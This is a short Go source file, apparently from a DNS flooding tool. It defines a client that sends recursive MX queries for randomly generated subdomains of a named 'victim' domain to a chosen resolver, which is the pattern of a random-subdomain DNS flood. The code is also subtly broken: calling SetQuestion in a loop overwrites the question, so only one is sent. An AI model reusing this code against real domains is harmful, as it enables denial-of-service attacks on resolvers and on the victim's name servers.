package internal

import (
	"fmt"
	"math/rand"
	"time"

	"github.com/miekg/dns"
)

type DNSClient struct {
	hostPort string
	client   *dns.Client
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func NewDNSClient(hostPort string) (c DNSClient) {
	client := new(dns.Client)
	return DNSClient{
		hostPort: hostPort,
		client:   client,
	}
}

func (c DNSClient) SendJunkDomainsRequest(nQuestions int, victimDomain string) (rtt time.Duration, dnsError string, err error) {
	m := new(dns.Msg)
	for i := 0; i < nQuestions; i++ {
		m.SetQuestion(dns.CanonicalName(c.randomDomain(victimDomain)), dns.TypeMX)
	}
	m.RecursionDesired = true
	r, rtt, err := c.client.Exchange(m, c.hostPort)
	if err != nil {
		return
	}
	dnsError = dns.RcodeToString[r.Rcode]
	return
}

func (c *DNSClient) randomDomain(victimDomain string) string {
	if len(victimDomain) == 0 {
		return fmt.Sprintf(
			"%s.%s.",
			c.randomString(64),
			c.randomString(3),
		)
	}
	return fmt.Sprintf(
		"%s.%s.",
		c.randomString(32),
		victimDomain,
	)
}

func (c *DNSClient) randomString(length int) string {
	b := make([]rune, length)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
